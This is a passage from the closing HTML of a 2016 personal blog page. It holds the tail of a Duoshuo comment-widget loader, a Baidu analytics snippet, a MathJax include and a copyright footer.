    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0] 
     || document.getElementsByTagName('body')[0]).appendChild(ds);
})();

</script><div class="copyright"><p>© 2016 <a href="http://binyanbin.github.io">严彬</a>, unless otherwise noted.</p></div></footer><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "//hm.baidu.com/hm.js?fcf7e8f303b6e03be86f5619636d0f7e";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script src="https://cdn.bootcss.com/mathjax/2.5.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>